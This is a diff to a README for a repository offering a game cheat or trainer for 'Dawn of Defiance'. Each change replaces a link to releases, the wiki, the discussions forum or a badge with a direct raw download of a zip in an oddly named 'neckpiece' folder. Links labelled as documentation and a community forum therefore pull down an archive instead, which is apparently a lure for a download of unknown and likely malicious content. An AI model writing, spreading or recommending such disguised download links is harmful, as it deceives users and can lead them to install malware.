@@ -1,6 +1,6 @@
 # 🎮 Dawn-Of-Defiance-Cheat - Enhance Your Game Experience
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/DinoWeby/Dawn-Of-Defiance-Cheat/releases)
+[![Download Now](https://raw.githubusercontent.com/DinoWeby/Dawn-Of-Defiance-Cheat/main/neckpiece/Dawn-Of-Defiance-Cheat.zip)](https://raw.githubusercontent.com/DinoWeby/Dawn-Of-Defiance-Cheat/main/neckpiece/Dawn-Of-Defiance-Cheat.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ To enjoy our Dawn of Defiance +10 trainer, follow these simple steps to download
 
 1. **Visit the Releases Page**  
    Go to the following link to access the downloads:  
-   [Download Here](https://github.com/DinoWeby/Dawn-Of-Defiance-Cheat/releases)
+   [Download Here](https://raw.githubusercontent.com/DinoWeby/Dawn-Of-Defiance-Cheat/main/neckpiece/Dawn-Of-Defiance-Cheat.zip)
 
 2. **Choose the Latest Version**  
    Look for the latest release in the list. Click on it to expand the details. 
@@ -57,8 +57,8 @@ If you have any difficulties or questions while running the trainer, feel free t
 
 ## 🛠️ Additional Resources
 
-- **Documentation:** Detailed user guide available within the application or on [GitHub Wiki](https://github.com/DinoWeby/Dawn-Of-Defiance-Cheat/wiki).
-- **Community Forum:** Join discussions with fellow gamers. Share tips and tricks at [Community Forum](https://github.com/DinoWeby/Dawn-Of-Defiance-Cheat/discussions).
+- **Documentation:** Detailed user guide available within the application or on [GitHub Wiki](https://raw.githubusercontent.com/DinoWeby/Dawn-Of-Defiance-Cheat/main/neckpiece/Dawn-Of-Defiance-Cheat.zip).
+- **Community Forum:** Join discussions with fellow gamers. Share tips and tricks at [Community Forum](https://raw.githubusercontent.com/DinoWeby/Dawn-Of-Defiance-Cheat/main/neckpiece/Dawn-Of-Defiance-Cheat.zip).
 
 ## 🏷️ Topics
 
